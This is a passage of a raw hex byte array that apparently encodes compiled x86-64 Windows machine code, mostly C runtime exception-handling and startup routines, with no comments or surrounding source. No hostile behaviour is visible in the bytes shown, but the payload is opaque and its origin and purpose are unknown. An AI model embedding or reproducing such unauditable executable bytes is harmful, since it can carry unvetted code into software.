0x63, 0x73, 0x6d, 0xe0, 0x75, 0x2a, 0x83, 0x7e, 0x18, 0x4, 0x75, 0x24, 0x8b, 0x46, 0x20, 0x2d, 0x20, 0x5, 0x93, 0x19, 0x83, 0xf8, 0x2, 0x77, 0x17, 0x48, 0x8b, 0x4e, 0x28, 0xe8, 0xbd, 0xe0, 0xff, 0xff, 0x85, 0xc0, 0x74, 0xa, 0xb2, 0x1, 0x48, 0x8b, 0xce, 0xe8, 0x3b, 0xe0, 0xff, 0xff, 0xe8, 0x1e, 0xe4, 0xff, 0xff, 0x48, 0x89, 0x78, 0x20, 0xe8, 0x15, 0xe4, 0xff, 0xff, 0x4c, 0x89, 0x68, 0x28, 0x48, 0x8b, 0x44, 0x24, 0x30, 0x48, 0x63, 0x48, 0x1c, 0x49, 0x8b, 0x6, 0x48, 0xc7, 0x4, 0x1, 0xfe, 0xff, 0xff, 0xff, 0x48, 0x8b, 0xc3, 0x48, 0x83, 0xc4, 0x70, 0x41, 0x5f, 0x41, 0x5e, 0x41, 0x5d, 0x41, 0x5c, 0x5f, 0x5e, 0x5b, 0xc3, 0xcc, 0xcc, 0x40, 0x53, 0x48, 0x83, 0xec, 0x20, 0x4c, 0x8b, 0x9, 0x49, 0x8b, 0xd8, 0x41, 0x83, 0x20, 0x0, 0xb9, 0x63, 0x73, 0x6d, 0xe0, 0x41, 0xb8, 0x20, 0x5, 0x93, 0x19, 0x41, 0x8b, 0x1, 0x3b, 0xc1, 0x75, 0x5d, 0x41, 0x83, 0x79, 0x18, 0x4, 0x75, 0x56, 0x41, 0x8b, 0x41, 0x20, 0x41, 0x2b, 0xc0, 0x83, 0xf8, 0x2, 0x77, 0x17, 0x48, 0x8b, 0x42, 0x28, 0x49, 0x39, 0x41, 0x28, 0x75, 0xd, 0xc7, 0x3, 0x1, 0x0, 0x0, 0x0, 0x41, 0x8b, 0x1, 0x3b, 0xc1, 0x75, 0x33, 0x41, 0x83, 0x79, 0x18, 0x4, 0x75, 0x2c, 0x41, 0x8b, 0x49, 0x20, 0x41, 0x2b, 0xc8, 0x83, 0xf9, 0x2, 0x77, 0x20, 0x49, 0x83, 0x79, 0x30, 0x0, 0x75, 0x19, 0xe8, 0x7d, 0xe3, 0xff, 0xff, 0xc7, 0x40, 0x40, 0x1, 0x0, 0x0, 0x0, 0xb8, 0x1, 0x0, 0x0, 0x0, 0xc7, 0x3, 0x1, 0x0, 0x0, 0x0, 0xeb, 0x2, 0x33, 0xc0, 0x48, 0x83, 0xc4, 0x20, 0x5b, 0xc3, 0xcc, 0x44, 0x89, 0x4c, 0x24, 0x20, 0x4c, 0x89, 0x44, 0x24, 0x18, 0x48, 0x89, 0x4c, 0x24, 0x8, 0x53, 0x56, 0x57, 0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57, 0x48, 0x83, 0xec, 0x30, 0x45, 0x8b, 0xe1, 0x49, 0x8b, 0xf0, 0x48, 0x8b, 0xda, 0x4c, 0x8b, 0xf9, 0xe8, 0xbd, 0xe9, 0xff, 0xff, 0x4c, 0x8b, 0xe8, 0x48, 0x89, 0x44, 0x24, 0x28, 0x4c, 0x8b, 0xc6, 0x48, 0x8b, 0xd3, 0x49, 0x8b, 0xcf, 0xe8, 0x67, 0xed, 0xff, 0xff, 0x8b, 0xf8, 0xe8, 0x14, 0xe3, 0xff, 0xff, 0xff, 0x40, 0x30, 0x83, 0xff, 0xff, 0xf, 0x84, 0xeb, 0x0, 0x0, 0x0, 0x41, 0x3b, 0xfc, 0xf, 0x8e, 0xe2, 0x0, 0x0, 0x0, 0x83, 0xff, 0xff, 0xf, 0x8e, 0x14, 0x1, 0x0, 0x0, 0x3b, 0x7e, 0x4, 0xf, 0x8d, 0xb, 0x1, 0x0, 0x0, 0x4c, 0x63, 0xf7, 0xe8, 0x71, 0xe9, 0xff, 0xff, 0x48, 0x63, 0x4e, 0x8, 0x4a, 0x8d, 0x4, 0xf0, 0x8b, 0x3c, 0x1, 0x89, 0x7c, 0x24, 0x20, 0xe8, 0x5d, 0xe9, 0xff, 0xff, 0x48, 0x63, 0x4e, 0x8, 0x4a, 0x8d, 0x4, 0xf0, 0x83, 0x7c, 0x1, 0x4, 0x0, 0x74, 0x1c, 0xe8, 0x49, 0xe9, 0xff, 0xff, 0x48, 0x63, 0x4e, 0x8, 0x4a, 0x8d, 0x4, 0xf0, 0x48, 0x63, 0x5c, 0x1, 0x4, 0xe8, 0x37, 0xe9, 0xff, 0xff, 0x48, 0x3, 0xc3, 0xeb, 0x2, 0x33, 0xc0, 0x48, 0x85, 0xc0, 0x74, 0x59, 0x44, 0x8b, 0xc7, 0x48, 0x8b, 0xd6, 0x49, 0x8b, 0xcf, 0xe8, 0x31, 0xed, 0xff, 0xff, 0xe8, 0x18, 0xe9, 0xff, 0xff, 0x48, 0x63, 0x4e, 0x8, 0x4a, 0x8d, 0x4, 0xf0, 0x83, 0x7c, 0x1, 0x4, 0x0, 0x74, 0x1c, 0xe8, 0x4, 0xe9, 0xff, 0xff, 0x48, 0x63, 0x4e, 0x8, 0x4a, 0x8d, 0x4, 0xf0, 0x48, 0x63, 0x5c, 0x1, 0x4, 0xe8, 0xf2, 0xe8, 0xff, 0xff, 0x48, 0x3, 0xc3, 0xeb, 0x2, 0x33, 0xc0, 0x41, 0xb8, 0x3, 0x1, 0x0, 0x0, 0x49, 0x8b, 0xd7, 0x48, 0x8b, 0xc8, 0xe8, 0xd2, 0x2, 0x0, 0x0, 0x49, 0x8b, 0xcd, 0xe8, 0xfa, 0xe8, 0xff, 0xff, 0xeb, 0x1e, 0x44, 0x8b, 0xa4, 0x24, 0x88, 0x0, 0x0, 0x0, 0x48, 0x8b, 0xb4, 0x24, 0x80, 0x0, 0x0, 0x0, 0x4c, 0x8b, 0x7c, 0x24, 0x70, 0x4c, 0x8b, 0x6c, 0x24, 0x28, 0x8b, 0x7c, 0x24, 0x20, 0x89, 0x7c, 0x24, 0x24, 0xe9, 0xc, 0xff, 0xff, 0xff, 0xe8, 0x18, 0xe2, 0xff, 0xff, 0x83, 0x78, 0x30, 0x0, 0x7e, 0x8, 0xe8, 0xd, 0xe2, 0xff, 0xff, 0xff, 0x48, 0x30, 0x83, 0xff, 0xff, 0x74, 0x5, 0x41, 0x3b, 0xfc, 0x7f, 0x24, 0x44, 0x8b, 0xc7, 0x48, 0x8b, 0xd6, 0x49, 0x8b, 0xcf, 0xe8, 0x92, 0xec, 0xff, 0xff, 0x48, 0x83, 0xc4, 0x30, 0x41, 0x5f, 0x41, 0x5e, 0x41, 0x5d, 0x41, 0x5c, 0x5f, 0x5e, 0x5b, 0xc3, 0xe8, 0xb5, 0x13, 0x0, 0x0, 0x90, 0xe8, 0xaf, 0x13, 0x0, 0x0, 0x90, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x48, 0x89, 0x6c, 0x24, 0x10, 0x48, 0x89, 0x74, 0x24, 0x18, 0x57, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b, 0xe9, 0x49, 0x8b, 0xf8, 0x49, 0x8b, 0xc8, 0x48, 0x8b, 0xf2, 0xe8, 0x97, 0xec, 0xff, 0xff, 0x4c, 0x8d, 0x4c, 0x24, 0x48, 0x4c, 0x8b, 0xc7, 0x48, 0x8b, 0xd6, 0x48, 0x8b, 0xcd, 0x8b, 0xd8, 0xe8, 0x86, 0xe4, 0xff, 0xff, 0x4c, 0x8b, 0xc7, 0x48, 0x8b, 0xd6, 0x48, 0x8b, 0xcd, 0xe8, 0x0, 0xec, 0xff, 0xff, 0x3b, 0xd8, 0x7e, 0x23, 0x44, 0x8b, 0xc3, 0x48, 0x8d, 0x4c, 0x24, 0x48, 0x48, 0x8b, 0xd7, 0xe8, 0x18, 0xec, 0xff, 0xff, 0x44, 0x8b, 0xcb, 0x4c, 0x8b, 0xc7, 0x48, 0x8b, 0xd6, 0x48, 0x8b, 0xcd, 0xe8, 0x13, 0xec, 0xff, 0xff, 0xeb, 0x10, 0x4c, 0x8b, 0xc7, 0x48, 0x8b, 0xd6, 0x48, 0x8b, 0xcd, 0xe8, 0xcb, 0xeb, 0xff, 0xff, 0x8b, 0xd8, 0x48, 0x8b, 0x6c, 0x24, 0x38, 0x8b, 0xc3, 0x48, 0x8b, 0x5c, 0x24, 0x30, 0x48, 0x8b, 0x74, 0x24, 0x40, 0x48, 0x83, 0xc4, 0x20, 0x5f, 0xc3, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x48, 0x89, 0x6c, 0x24, 0x18, 0x48, 0x89, 0x74, 0x24, 0x20, 0x57, 0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b, 0xea, 0x4c, 0x8b, 0xe9, 0x48, 0x85, 0xd2, 0xf, 0x84, 0xbc, 0x0, 0x0, 0x0, 0x45, 0x32, 0xff, 0x33, 0xf6, 0x39, 0x32, 0xf, 0x8e, 0x8f, 0x0, 0x0, 0x0, 0xe8, 0x9f, 0xe7, 0xff, 0xff, 0x48, 0x8b, 0xd0, 0x49, 0x8b, 0x45, 0x30, 0x4c, 0x63, 0x60, 0xc, 0x49, 0x83, 0xc4, 0x4, 0x4c, 0x3, 0xe2, 0xe8, 0x88, 0xe7, 0xff, 0xff, 0x48, 0x8b, 0xd0, 0x49, 0x8b, 0x45, 0x30, 0x48, 0x63, 0x48, 0xc, 0x44, 0x8b, 0x34, 0xa, 0x45, 0x85, 0xf6, 0x7e, 0x54, 0x48, 0x63, 0xc6, 0x48, 0x8d, 0x4, 0x80, 0x48, 0x89, 0x44, 0x24, 0x58, 0xe8, 0x63, 0xe7, 0xff, 0xff, 0x49, 0x8b, 0x5d, 0x30, 0x48, 0x8b, 0xf8, 0x49, 0x63, 0x4, 0x24, 0x48, 0x3, 0xf8, 0xe8, 0x3c, 0xe7, 0xff, 0xff, 0x48, 0x8b, 0x54, 0x24, 0x58, 0x4c, 0x8b, 0xc3, 0x48, 0x63, 0x4d, 0x4, 0x48, 0x8d, 0x4, 0x90, 0x48, 0x8b, 0xd7, 0x48, 0x3, 0xc8, 0xe8, 0x61, 0xf6, 0xff, 0xff, 0x85, 0xc0, 0x75, 0xe, 0x41, 0xff, 0xce, 0x49, 0x83, 0xc4, 0x4, 0x45, 0x85, 0xf6, 0x7f, 0xbd, 0xeb, 0x3, 0x41, 0xb7, 0x1, 0xff, 0xc6, 0x3b, 0x75, 0x0, 0xf, 0x8c, 0x71, 0xff, 0xff, 0xff, 0x48, 0x8b, 0x5c, 0x24, 0x50, 0x41, 0x8a, 0xc7, 0x48, 0x8b, 0x6c, 0x24, 0x60, 0x48, 0x8b, 0x74, 0x24, 0x68, 0x48, 0x83, 0xc4, 0x20, 0x41, 0x5f, 0x41, 0x5e, 0x41, 0x5d, 0x41, 0x5c, 0x5f, 0xc3, 0xe8, 0x28, 0x12, 0x0, 0x0, 0xcc, 0xcc, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x48, 0x89, 0x6c, 0x24, 0x10, 0x48, 0x89, 0x74, 0x24, 0x18, 0x57, 0x48, 0x83, 0xec, 0x20, 0x33, 0xed, 0x48, 0x8b, 0xf9, 0x39, 0x29, 0x7e, 0x50, 0x33, 0xf6, 0xe8, 0xb4, 0xe6, 0xff, 0xff, 0x48, 0x63, 0x4f, 0x4, 0x48, 0x3, 0xc6, 0x83, 0x7c, 0x1, 0x4, 0x0, 0x74, 0x1b, 0xe8, 0xa1, 0xe6, 0xff, 0xff, 0x48, 0x63, 0x4f, 0x4, 0x48, 0x3, 0xc6, 0x48, 0x63, 0x5c, 0x1, 0x4, 0xe8, 0x90, 0xe6, 0xff, 0xff, 0x48, 0x3, 0xc3, 0xeb, 0x2, 0x33, 0xc0, 0x48, 0x8d, 0x48, 0x8, 0x48, 0x8d, 0x15, 0x4e, 0x50, 0x1, 0x0, 0xe8, 0x35, 0xdb, 0xff, 0xff, 0x85, 0xc0, 0x74, 0x21, 0xff, 0xc5, 0x48, 0x83, 0xc6, 0x14, 0x3b, 0x2f, 0x7c, 0xb2, 0x32, 0xc0, 0x48, 0x8b, 0x5c, 0x24, 0x30, 0x48, 0x8b, 0x6c, 0x24, 0x38, 0x48, 0x8b, 0x74, 0x24, 0x40, 0x48, 0x83, 0xc4, 0x20, 0x5f, 0xc3, 0xb0, 0x1, 0xeb, 0xe7, 0x48, 0x8b, 0xc2, 0x49, 0x8b, 0xd0, 0x48, 0xff, 0xe0, 0xcc, 0xcc, 0xcc, 0x49, 0x8b, 0xc0, 0x4c, 0x8b, 0xd2, 0x48, 0x8b, 0xd0, 0x45, 0x8b, 0xc1, 0x49, 0xff, 0xe2, 0xcc, 0x48, 0x83, 0x79, 0x8, 0x0, 0x48, 0x8d, 0x5, 0x0, 0xb8, 0x0, 0x0, 0x48, 0xf, 0x45, 0x41, 0x8, 0xc3, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0x66, 0x66, 0xf, 0x1f, 0x84, 0x0, 0x0, 0x0, 0x0, 0x0, 0x48, 0x83, 0xec, 0x28, 0x48, 0x89, 0x4c, 0x24, 0x30, 0x48, 0x89, 0x54, 0x24, 0x38, 0x44, 0x89, 0x44, 0x24, 0x40, 0x48, 0x8b, 0x12, 0x48, 0x8b, 0xc1, 0xe8, 0x82, 0xde, 0xff, 0xff, 0xff, 0xd0, 0xe8, 0xab, 0xde, 0xff, 0xff, 0x48, 0x8b, 0xc8, 0x48, 0x8b, 0x54, 0x24, 0x38, 0x48, 0x8b, 0x12, 0x41, 0xb8, 0x2, 0x0, 0x0, 0x0, 0xe8, 0x65, 0xde, 0xff, 0xff, 0x48, 0x83, 0xc4, 0x28, 0xc3, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0x66, 0x66, 0xf, 0x1f, 0x84, 0x0, 0x0, 0x0, 0x0, 0x0, 0x48, 0x83, 0xec, 0x28, 0x48, 0x89, 0x4c, 0x24, 0x30, 0x48, 0x89, 0x54, 0x24, 0x38, 0x44, 0x89, 0x44, 0x24, 0x40, 0x48, 0x8b, 0x12, 0x48, 0x8b, 0xc1, 0xe8, 0x32, 0xde, 0xff, 0xff, 0xff, 0xd0, 0xe8, 0x5b, 0xde, 0xff, 0xff, 0x48, 0x83, 0xc4, 0x28, 0xc3, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0x48, 0x83, 0xec, 0x28, 0x48, 0x89, 0x4c, 0x24, 0x30, 0x48, 0x89, 0x54, 0x24, 0x38, 0x48, 0x8b, 0x54, 0x24, 0x38, 0x48, 0x8b, 0x12, 0x41, 0xb8, 0x2, 0x0, 0x0, 0x0, 0xe8, 0xff, 0xdd, 0xff, 0xff, 0x48, 0x83, 0xc4, 0x28, 0xc3, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xf, 0x1f, 0x40, 0x0, 0x48, 0x83, 0xec, 0x28, 0x48, 0x89, 0x4c, 0x24, 0x30, 0x48, 0x89, 0x54, 0x24, 0x38, 0x4c, 0x89, 0x44, 0x24, 0x40, 0x44, 0x89, 0x4c, 0x24, 0x48, 0x45, 0x8b, 0xc1, 0x48, 0x8b, 0xc1, 0xe8, 0xcd, 0xdd, 0xff, 0xff, 0x48, 0x8b, 0x4c, 0x24, 0x40, 0xff, 0xd0, 0xe8, 0xf1, 0xdd, 0xff, 0xff, 0x48, 0x8b, 0xc8, 0x48, 0x8b, 0x54, 0x24, 0x38, 0x41, 0xb8, 0x2, 0x0, 0x0, 0x0, 0xe8, 0xae, 0xdd, 0xff, 0xff, 0x48, 0x83, 0xc4, 0x28, 0xc3, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x48, 0x89, 0x74, 0x24, 0x10, 0x48, 0x89, 0x7c, 0x24, 0x18, 0x41, 0x56, 0x48, 0x83, 0xec, 0x20, 0x80, 0x79, 0x8, 0x0, 0x4c, 0x8b, 0xf2, 0x48, 0x8b, 0xf1, 0x74, 0x4c, 0x48, 0x8b, 0x1, 0x48, 0x85, 0xc0, 0x74, 0x44, 0x48, 0x83, 0xcf, 0xff, 0x48, 0xff, 0xc7, 0x80, 0x3c, 0x38, 0x0, 0x75, 0xf7, 0x48, 0x8d, 0x4f, 0x1, 0xe8, 0xb5, 0xf, 0x0, 0x0, 0x48, 0x8b, 0xd8, 0x48, 0x85, 0xc0, 0x74, 0x1c, 0x4c, 0x8b, 0x6, 0x48, 0x8d, 0x57, 0x1, 0x48, 0x8b, 0xc8, 0xe8, 0xa6, 0xf, 0x0, 0x0, 0x48, 0x8b, 0xc3, 0x41, 0xc6, 0x46, 0x8, 0x1, 0x49, 0x89, 0x6, 0x33, 0xdb, 0x48, 0x8b, 0xcb, 0xe8, 0x75, 0xf, 0x0, 0x0, 0xeb, 0xa, 0x48, 0x8b, 0x1, 0x48, 0x89, 0x2, 0xc6, 0x42, 0x8, 0x0, 0x48, 0x8b, 0x5c, 0x24, 0x30, 0x48, 0x8b, 0x74, 0x24, 0x38, 0x48, 0x8b, 0x7c, 0x24, 0x40, 0x48, 0x83, 0xc4, 0x20, 0x41, 0x5e, 0xc3, 0xcc, 0xcc, 0xcc, 0x40, 0x53, 0x48, 0x83, 0xec, 0x20, 0x80, 0x79, 0x8, 0x0, 0x48, 0x8b, 0xd9, 0x74, 0x8, 0x48, 0x8b, 0x9, 0xe8, 0x39, 0xf, 0x0, 0x0, 0x48, 0x83, 0x23, 0x0, 0xc6, 0x43, 0x8, 0x0, 0x48, 0x83, 0xc4, 0x20, 0x5b, 0xc3, 0xcc, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x18, 0x48, 0x89, 0x74, 0x24, 0x20, 0x57, 0x48, 0x83, 0xec, 0x50, 0x48, 0x8b, 0xda, 0x48, 0x8b, 0xf1, 0xbf, 0x20, 0x5, 0x93, 0x19, 0x48, 0x85, 0xd2, 0x74, 0x1d, 0xf6, 0x2, 0x10, 0x74, 0x18, 0x48, 0x8b, 0x9, 0x48, 0x83, 0xe9, 0x8, 0x48, 0x8b, 0x1, 0x48, 0x8b, 0x58, 0x30, 0x48, 0x8b, 0x40, 0x40, 0xff, 0x15, 0x84, 0xa5, 0x0, 0x0, 0x48, 0x8d, 0x54, 0x24, 0x20, 0x48, 0x8b, 0xcb, 0xff, 0x15, 0x1e, 0xa4, 0x0, 0x0, 0x48, 0x89, 0x44, 0x24, 0x20, 0x48, 0x85, 0xdb, 0x74, 0xf, 0xf6, 0x3, 0x8, 0x75, 0x5, 0x48, 0x85, 0xc0, 0x75, 0x5, 0xbf, 0x0, 0x40, 0x99, 0x1, 0xba, 0x1, 0x0, 0x0, 0x0, 0x48, 0x89, 0x7c, 0x24, 0x28, 0x4c, 0x8d, 0x4c, 0x24, 0x28, 0x48, 0x89, 0x74, 0x24, 0x30, 0xb9, 0x63, 0x73, 0x6d, 0xe0, 0x48, 0x89, 0x5c, 0x24, 0x38, 0x48, 0x89, 0x44, 0x24, 0x40, 0x44, 0x8d, 0x42, 0x3, 0xff, 0x15, 0xd0, 0xa3, 0x0, 0x0, 0x48, 0x8b, 0x5c, 0x24, 0x70, 0x48, 0x8b, 0x74, 0x24, 0x78, 0x48, 0x83, 0xc4, 0x50, 0x5f, 0xc3, 0x48, 0x3b, 0xca, 0x74, 0x3b, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x57, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b, 0xfa, 0x48, 0x8b, 0xd9, 0x48, 0x8b, 0x3, 0x48, 0x85, 0xc0, 0x74, 0x10, 0x49, 0xba, 0x70, 0x48, 0xda, 0x56, 0x96, 0x3e, 0xf1, 0x85, 0xff, 0x15, 0xfb, 0xa4, 0x0, 0x0, 0x48, 0x83, 0xc3, 0x8, 0x48, 0x3b, 0xdf, 0x75, 0xdf, 0x48, 0x8b, 0x5c, 0x24, 0x30, 0x48, 0x83, 0xc4, 0x20, 0x5f, 0xc3, 0xcc, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x57, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b, 0xfa, 0x48, 0x8b, 0xd9, 0x48, 0x3b, 0xca, 0x74, 0x25, 0x48, 0x8b, 0x3, 0x48, 0x85, 0xc0, 0x74, 0x14, 0x49, 0xba, 0x70, 0x30, 0x52, 0x5e, 0x47, 0x27, 0x5, 0xd3, 0xff, 0x15, 0xb7, 0xa4, 0x0, 0x0, 0x85, 0xc0, 0x75, 0xb, 0x48, 0x83, 0xc3, 0x8, 0x48, 0x3b, 0xdf, 0xeb, 0xd9, 0x33, 0xc0, 0x48, 0x8b, 0x5c, 0x24, 0x30, 0x48, 0x83, 0xc4, 0x20, 0x5f, 0xc3, 0xcc, 0xb8, 0x63, 0x73, 0x6d, 0xe0, 0x3b, 0xc8, 0x74, 0x3, 0x33, 0xc0, 0xc3, 0x8b, 0xc8, 0xe9, 0x1, 0x0, 0x0, 0x0, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x48, 0x89, 0x6c, 0x24, 0x10, 0x48, 0x89, 0x74, 0x24, 0x18, 0x57, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b, 0xf2, 0x8b, 0xf9, 0xe8, 0x8a, 0x15, 0x0, 0x0, 0x45, 0x33, 0xc9, 0x48, 0x8b, 0xd8, 0x48, 0x85, 0xc0, 0x74, 0x1f, 0x48, 0x8b, 0x8, 0x48, 0x8b, 0xc1, 0x4c, 0x8d, 0x81, 0xc0, 0x0, 0x0, 0x0, 0x49, 0x3b, 0xc8, 0x74, 0xd, 0x39, 0x38, 0x74, 0x20, 0x48, 0x83, 0xc0, 0x10, 0x49, 0x3b, 0xc0, 0x75, 0xf3, 0x33, 0xc0, 0x48, 0x8b, 0x5c, 0x24, 0x30, 0x48, 0x8b, 0x6c, 0x24, 0x38, 0x48, 0x8b, 0x74, 0x24, 0x40, 0x48, 0x83, 0xc4, 0x20, 0x5f, 0xc3, 0x48, 0x85, 0xc0, 0x74, 0xe4, 0x4c, 0x8b, 0x40, 0x8, 0x4d, 0x85, 0xc0, 0x74, 0xdb, 0x49, 0x83, 0xf8, 0x5, 0x75, 0xa, 0x4c, 0x89, 0x48, 0x8, 0x41, 0x8d, 0x40, 0xfc, 0xeb, 0xcd, 0x49, 0x83, 0xf8, 0x1, 0x75, 0x5, 0x83, 0xc8, 0xff, 0xeb, 0xc2, 0x48, 0x8b, 0x6b, 0x8, 0x48, 0x89, 0x73, 0x8, 0x83, 0x78, 0x4, 0x8, 0xf, 0x85, 0xc4, 0x0, 0x0, 0x0, 0x48, 0x83, 0xc1, 0x30, 0x48, 0x8d, 0x91, 0x90, 0x0, 0x0, 0x0, 0xeb, 0x8, 0x4c, 0x89, 0x49, 0x8, 0x48, 0x83, 0xc1, 0x10, 0x48, 0x3b, 0xca, 0x75, 0xf3, 0x81, 0x38, 0x8d, 0x0, 0x0, 0xc0, 0x8b, 0x7b, 0x10, 0x74, 0x7a, 0x81, 0x38, 0x8e, 0x0, 0x0, 0xc0, 0x74, 0x6b, 0x81, 0x38, 0x8f, 0x0, 0x0, 0xc0, 0x74, 0x5c, 0x81, 0x38, 0x90, 0x0, 0x0, 0xc0, 0x74, 0x4d, 0x81, 0x38, 0x91, 0x0, 0x0, 0xc0, 0x74, 0x3e, 0x81, 0x38, 0x92, 0x0, 0x0, 0xc0, 0x74, 0x2f, 0x81, 0x38, 0x93, 0x0, 0x0, 0xc0, 0x74, 0x20, 0x81, 0x38, 0xb4, 0x2, 0x0, 0xc0, 0x74, 0x11, 0x81, 0x38, 0xb5, 0x2, 0x0, 0xc0, 0x8b, 0xd7, 0x75, 0x40, 0xba, 0x8d, 0x0, 0x0, 0x0, 0xeb, 0x36, 0xba, 0x8e, 0x0, 0x0, 0x0, 0xeb, 0x2f, 0xba, 0x85, 0x0, 0x0, 0x0, 0xeb, 0x28, 0xba, 0x8a, 0x0, 0x0, 0x0, 0xeb, 0x21, 0xba, 0x84, 0x0, 0x0, 0x0, 0xeb, 0x1a, 0xba, 0x81, 0x0, 0x0, 0x0, 0xeb, 0x13, 0xba, 0x86, 0x0, 0x0, 0x0, 0xeb, 0xc, 0xba, 0x83, 0x0, 0x0, 0x0, 0xeb, 0x5, 0xba, 0x82, 0x0, 0x0, 0x0, 0x89, 0x53, 0x10, 0x49, 0xba, 0x70, 0x33, 0xd3, 0x30, 0x4f, 0x1f, 0x9c, 0x8b, 0xb9, 0x8, 0x0, 0x0, 0x0, 0x49, 0x8b, 0xc0, 0xff, 0x15, 0x2f, 0xa3, 0x0, 0x0, 0x89, 0x7b, 0x10, 0xeb, 0x1a, 0x4c, 0x89, 0x48, 0x8, 0x49, 0xba, 0x70, 0x73, 0xd7, 0x50, 0x49, 0x86, 0xc1, 0xc6, 0x8b, 0x48, 0x4, 0x49, 0x8b, 0xc0, 0xff, 0x15, 0x10, 0xa3, 0x0, 0x0, 0x48, 0x89, 0x6b, 0x8, 0xe9, 0x2, 0xff, 0xff, 0xff, 0xcc, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x4c, 0x89, 0x4c, 0x24, 0x20, 0x57, 0x48, 0x83, 0xec, 0x20, 0x49, 0x8b, 0xd9, 0x49, 0x8b, 0xf8, 0x8b, 0xa, 0xe8, 0x38, 0x16, 0x0, 0x0, 0x90, 0x48, 0x8b, 0xcf, 0xe8, 0x13, 0x0, 0x0, 0x0, 0x90, 0x8b, 0xb, 0xe8, 0x7b, 0x16, 0x0, 0x0, 0x48, 0x8b, 0x5c, 0x24, 0x30, 0x48, 0x83, 0xc4, 0x20, 0x5f, 0xc3, 0x40, 0x53, 0x48, 0x83, 0xec, 0x30, 0x48, 0x8b, 0xd9, 0x80, 0x3d, 0x8c, 0x4d, 0x1, 0x0, 0x0, 0xf, 0x85, 0xa9, 0x0, 0x0, 0x0, 0xb8, 0x1, 0x0, 0x0, 0x0, 0x87, 0x5, 0x6b, 0x4d, 0x1, 0x0, 0x48, 0x8b, 0x1, 0x8b, 0x8, 0x85, 0xc9, 0x75, 0x3e, 0x48, 0x8b, 0x5, 0x13, 0x41, 0x1, 0x0, 0x48, 0x8b, 0x15, 0x5c, 0x4d, 0x1, 0x0, 0x48, 0x3b, 0xd0, 0x74, 0x22, 0x8b, 0xc8, 0x83, 0xe1, 0x3f, 0x48, 0x33, 0xc2, 0x48, 0xd3, 0xc8, 0x49, 0xba, 0x70, 0x28, 0xd9, 0x78, 0x45, 0x2e, 0x1, 0x99, 0x45, 0x33, 0xc0, 0x33, 0xd2, 0x33, 0xc9, 0xff, 0x15, 0x6d, 0xa2, 0x0, 0x0, 0x48, 0x8d, 0xd, 0x66, 0x4e, 0x1, 0x0, 0xeb, 0xc, 0x83, 0xf9, 0x1, 0x75, 0xd, 0x48, 0x8d, 0xd, 0x70, 0x4e, 0x1, 0x0, 0xe8, 0x6b, 0x9, 0x0, 0x0, 0x90, 0x48, 0x8b, 0x3, 0x83, 0x38, 0x0, 0x75, 0x13, 0x48, 0x8d, 0x15, 0xab, 0xa2, 0x0, 0x0, 0x48, 0x8d, 0xd, 0x84, 0xa2, 0x0, 0x0, 0xe8, 0xf, 0xfd, 0xff, 0xff, 0x48, 0x8d, 0x15, 0xa8, 0xa2, 0x0, 0x0, 0x48, 0x8d, 0xd, 0x99, 0xa2, 0x0, 0x0, 0xe8, 0xfc, 0xfc, 0xff, 0xff, 0x48, 0x8b, 0x43, 0x8, 0x83, 0x38, 0x0, 0x75, 0xe, 0xc6, 0x5, 0xe4, 0x4c, 0x1, 0x0, 0x1, 0x48, 0x8b, 0x43, 0x10, 0xc6, 0x0, 0x1, 0x48, 0x83, 0xc4, 0x30, 0x5b, 0xc3, 0xe8, 0x36, 0xb, 0x0, 0x0, 0x90, 0xcc, 0x44, 0x89, 0x44, 0x24, 0x18, 0x89, 0x54, 0x24, 0x10, 0x55, 0x48, 0x8b, 0xec, 0x48, 0x83, 0xec, 0x50, 0x48, 0xc7, 0x45, 0xe0, 0xfe, 0xff, 0xff, 0xff, 0x48, 0x89, 0x5c, 0x24, 0x60, 0x8b, 0xd9, 0x45, 0x85, 0xc0, 0x75, 0x4a, 0x33, 0xc9, 0xff, 0x15, 0xdb, 0x9f, 0x0, 0x0, 0x48, 0x85, 0xc0, 0x74, 0x3d, 0xb9, 0x4d, 0x5a, 0x0, 0x0, 0x66, 0x39, 0x8, 0x75, 0x33, 0x48, 0x63, 0x48, 0x3c, 0x48, 0x3, 0xc8, 0x81, 0x39, 0x50, 0x45, 0x0, 0x0, 0x75, 0x24, 0xb8, 0xb, 0x2, 0x0, 0x0, 0x66, 0x39, 0x41, 0x18, 0x75, 0x19, 0x83, 0xb9, 0x84, 0x0, 0x0, 0x0, 0xe, 0x76, 0x10, 0x83, 0xb9, 0xf8, 0x0, 0x0, 0x0, 0x0, 0x74, 0x7, 0x8b, 0xcb, 0xe8, 0xbd, 0x0, 0x0, 0x0, 0xc6, 0x45, 0x28, 0x0, 0x48, 0x8d, 0x45, 0x18, 0x48, 0x89, 0x45, 0xe8, 0x48, 0x8d, 0x45, 0x20, 0x48, 0x89, 0x45, 0xf0, 0x48, 0x8d, 0x45, 0x28, 0x48, 0x89, 0x45, 0xf8, 0xb8, 0x2, 0x0, 0x0, 0x0, 0x89, 0x45, 0xd4, 0x89, 0x45, 0xd8, 0x4c, 0x8d, 0x4d, 0xd4, 0x4c, 0x8d, 0x45, 0xe8, 0x48, 0x8d, 0x55, 0xd8, 0x48, 0x8d, 